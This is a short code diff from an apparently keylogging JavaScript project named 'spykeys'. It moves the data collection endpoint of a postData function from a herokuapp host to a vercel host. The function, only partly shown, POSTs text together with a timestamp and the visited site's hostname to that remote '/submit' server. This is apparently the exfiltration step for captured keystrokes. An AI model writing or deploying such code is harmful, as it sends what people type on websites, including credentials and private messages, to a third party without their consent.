@@ -87,7 +87,7 @@ async function postData(text = 'NULL') {
   let timestamp = Math.round(new Date().getTime()).toString().substring(0, 10);
   let domain = window.location.hostname;
 
-  const response = await fetch('https://api-spykeys.herokuapp.com/submit', {
+  const response = await fetch('https://api-spykeys.vercel.app/submit', {
     method: 'POST',
     mode: 'cors',
     cache: 'no-cache',
